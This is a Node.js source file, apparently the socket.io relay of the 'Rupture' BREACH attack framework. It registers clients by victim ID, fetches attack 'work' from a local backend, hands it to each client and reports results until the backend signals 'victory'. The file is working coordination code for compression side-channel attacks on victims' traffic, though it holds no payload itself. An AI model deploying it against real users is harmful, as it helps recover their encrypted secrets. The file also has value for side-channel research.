const io = require('socket.io'),
      winston = require('winston'),
      http = require('http');

winston.remove(winston.transports.Console);
winston.add(winston.transports.Console, {'timestamp': true});

const PORT = 3031;

winston.info('Rupture real-time service starting');
winston.info('Listening on port ' + PORT);

var socket = io.listen(PORT);

const BACKEND_HOST = 'localhost',
      BACKEND_PORT = '8000';

socket.on('connection', function(client) {
    winston.info('New connection from client ' + client.id);
    
    var victimId;
    client.on('client-hello', function({victim_id}) {
        victimId = victim_id;
        client.emit('server-hello');
    });

    var doNoWork = function() {
        client.emit('do-work', {});
    };

    var createNewWork = function() {
        var getWorkOptions = {
            host: BACKEND_HOST,
            port: BACKEND_PORT,
            path: '/breach/get_work/' + victimId
        };

        var getWorkRequest = http.request(getWorkOptions, function(response) {
            var responseData = '';
            response.on('data', function(chunk) {
                responseData += chunk;
            });
            response.on('end', function() {
                winston.info('Got (get-work) response from backend: ' + responseData);
                client.emit('do-work', JSON.parse(responseData));
            });
        });
        getWorkRequest.on('error', function(err) {
            winston.error('Caught getWorkRequest error: ' + err);
            doNoWork();
        });
        getWorkRequest.end();
    };

    var reportWorkCompleted = function(work) {
        var requestBodyString = JSON.stringify(work);

        var workCompletedOptions = {
            host: BACKEND_HOST,
            port: BACKEND_PORT,
            headers: {
                'Content-Type': 'application/json',
                'Content-Length': requestBodyString.length
            },
            path: '/breach/work_completed/' + victimId,
            method: 'POST',
        };

        var workCompletedRequest = http.request(workCompletedOptions, function(response) {
            var responseData = '';
            response.on('data', function(chunk) {
                responseData += chunk;
            });
            response.on('end', function() {
                winston.info('Got (work-completed) response from backend: ' + responseData);
                var victory = JSON.parse(responseData)['victory'];
                if (victory === false) {
                    createNewWork();
                }
            });
        });
        workCompletedRequest.on('error', function(err) {
            winston.error('Caught workCompletedRequest error: ' + err);
            doNoWork();
        });
        workCompletedRequest.write(requestBodyString);
        workCompletedRequest.end();
    };

    client.on('get-work', function() {
        winston.info('get-work from client ' + client.id);
        createNewWork();
    });

    client.on('work-completed', function({work, success, host}) {
        winston.info('Client indicates work completed: ', work, success, host);

        var requestBody = work;
        requestBody.success = success;
        reportWorkCompleted(requestBody);
    });
    client.on('disconnect', function() {
        winston.info('Client ' + client.id + ' disconnected');

        var requestBody = {
            success: false
        };
        reportWorkCompleted(requestBody);
    });
});
